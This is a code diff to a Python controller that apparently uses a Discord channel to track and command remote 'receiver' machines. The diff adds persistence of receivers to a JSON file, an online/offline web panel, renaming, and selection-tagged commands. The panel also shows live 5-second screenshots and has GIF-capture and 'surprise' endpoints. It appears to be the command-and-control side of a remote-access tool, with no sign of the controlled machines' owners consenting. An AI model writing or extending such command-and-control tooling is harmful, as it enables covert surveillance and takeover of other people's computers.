@@ -7,6 +7,7 @@ import subprocess
 import sys
 import tempfile
 import secrets
+import time
 from pathlib import Path
 from typing import Optional
 
@@ -46,8 +47,27 @@ assert TARGET_CHANNEL_ID
 
 ROOT_DIR = Path(__file__).parent
 _latest_screenshot: dict[str, str] = {"url": "", "message_id": "", "ts": ""}
-_receivers: set[str] = set()
+STATE_FILE = ROOT_DIR / "receivers.json"
+_receivers: dict[str, dict] = {}  # id -> {"name": str, "last_seen": float, "tag": str}
 _selected_receiver: Optional[str] = None
+
+def _load_state():
+    global _receivers, _selected_receiver
+    if STATE_FILE.is_file():
+        try:
+            data = json.loads(STATE_FILE.read_text())
+            _receivers = data.get("receivers", {})
+            _selected_receiver = data.get("selected")
+        except Exception:
+            pass
+
+def _save_state():
+    try:
+        STATE_FILE.write_text(json.dumps({"receivers": _receivers, "selected": _selected_receiver}))
+    except Exception:
+        pass
+
+_load_state()
 
 # ---------------- DISCORD ----------------
 intents = discord.Intents.default()
@@ -77,14 +97,20 @@ async def on_message(message: discord.Message):
                 _latest_screenshot["ts"] = str(message.created_at)
                 break
     # Track receiver announcements
-    if message.channel.id == COMMAND_CHANNEL_ID and message.content.startswith(f"{BOT_TAG} ONLINE"):
-        parts = message.content.split(maxsplit=2)
-        if len(parts) >= 3:
-            tag = parts[2].strip()
-            if tag:
-                _receivers.add(tag)
+    if message.channel.id == COMMAND_CHANNEL_ID:
+        if message.content.startswith(f"{BOT_TAG} ONLINE") or message.content.startswith(f"{BOT_TAG} PING"):
+            parts = message.content.split(maxsplit=3)
+            if len(parts) >= 4:
+                receiver_id = parts[2].strip()
+                tag = parts[3].strip()
+                now = time.time()
+                entry = _receivers.get(receiver_id, {"name": tag, "tag": tag, "last_seen": now})
+                entry["tag"] = tag
+                entry["last_seen"] = now
+                _receivers[receiver_id] = entry
                 if _selected_receiver is None:
-                    _selected_receiver = tag
+                    _selected_receiver = receiver_id
+                _save_state()
 # ---------------- WEBSOCKET HUB ----------------
 class Hub:
     def __init__(self):
@@ -153,6 +179,11 @@ CONTROL_HTML = """<!doctype html>
   <div class="card">
     <h1>Select Receiver</h1>
     <div id="receiver-buttons" class="row" style="flex-wrap: wrap;"></div>
+    <div id="receiver-offline" class="row" style="flex-wrap: wrap; margin-top:10px;"></div>
+    <form method="post" action="/ui/rename" style="margin-top:12px; display:flex; gap:8px; align-items:center;">
+      <input name="new_name" placeholder="Rename selected" style="flex:1; padding:8px; border-radius:8px; border:1px solid #1f2937; background:#0b1224; color:#e2e8f0;">
+      <button type="submit">Rename</button>
+    </form>
   </div>
   <div class="card">
     <h1>Live Screen (5s)</h1>
@@ -176,20 +207,34 @@ CONTROL_HTML = """<!doctype html>
         if (!res.ok) return;
         const data = await res.json();
         const wrap = document.getElementById('receiver-buttons');
+        const offlineWrap = document.getElementById('receiver-offline');
         wrap.innerHTML = '';
-        (data.receivers || []).forEach(tag => {
+        offlineWrap.innerHTML = '';
+        (data.online || []).forEach(rec => {
           const form = document.createElement('form');
           form.method = 'post';
-          form.action = '/ui/select/' + encodeURIComponent(tag);
+          form.action = '/ui/select/' + encodeURIComponent(rec.id);
           const btn = document.createElement('button');
           btn.type = 'submit';
-          btn.textContent = tag;
-          if (data.selected === tag) {
+          btn.textContent = rec.name || rec.tag;
+          if (data.selected === rec.id) {
             btn.style.background = '#10b981';
             btn.style.color = '#0b1224';
           }
           form.appendChild(btn);
           wrap.appendChild(form);
+        });
+        (data.offline || []).forEach(rec => {
+          const form = document.createElement('form');
+          form.method = 'post';
+          form.action = '/ui/select/' + encodeURIComponent(rec.id);
+          const btn = document.createElement('button');
+          btn.type = 'submit';
+          btn.textContent = rec.name || rec.tag;
+          btn.style.background = '#475569';
+          btn.style.color = '#e2e8f0';
+          form.appendChild(btn);
+          offlineWrap.appendChild(form);
         });
       } catch (e) { /* ignore */ }
     }
@@ -254,8 +299,9 @@ async def _send_cmd_with_files(msg: str, file_paths: list[Path]):
     await ch.send(content=msg, files=files)
 
 def _cmd_with_selection(cmd: str) -> str:
-    if _selected_receiver:
-        return f"{BOT_TAG} {cmd} {_selected_receiver}"
+    if _selected_receiver and _selected_receiver in _receivers:
+        tag = _receivers[_selected_receiver].get("name") or _receivers[_selected_receiver].get("tag")
+        return f"{BOT_TAG} {cmd} {tag} {_selected_receiver}"
     return f"{BOT_TAG} {cmd}"
 
 @app.post("/cmd/gif/start")
@@ -274,7 +320,16 @@ async def api_screenshot():
 
 @app.get("/api/receivers")
 async def api_receivers():
-    return JSONResponse({"receivers": sorted(_receivers), "selected": _selected_receiver})
+    now = time.time()
+    online = []
+    offline = []
+    for rid, info in _receivers.items():
+        data = {"id": rid, "name": info.get("name") or info.get("tag"), "tag": info.get("tag"), "last_seen": info.get("last_seen", 0)}
+        if now - data["last_seen"] <= 120:
+            online.append(data)
+        else:
+            offline.append(data)
+    return JSONResponse({"online": online, "offline": offline, "selected": _selected_receiver})
 
 @app.post("/ui/surprise")
 async def ui_surprise():
@@ -314,6 +369,16 @@ async def ui_select(tag: str):
     global _selected_receiver
     if tag in _receivers:
         _selected_receiver = tag
+        _save_state()
+    return RedirectResponse(url="/", status_code=303)
+
+@app.post("/ui/rename")
+async def ui_rename(new_name: str = Form(...)):
+    global _selected_receiver
+    if _selected_receiver and _selected_receiver in _receivers:
+        _receivers[_selected_receiver]["name"] = new_name
+        _save_state()
+        await _send_cmd(f"{BOT_TAG} SET_NAME {_selected_receiver} {new_name}")
     return RedirectResponse(url="/", status_code=303)
 
 # ---------------- STARTUP ----------------
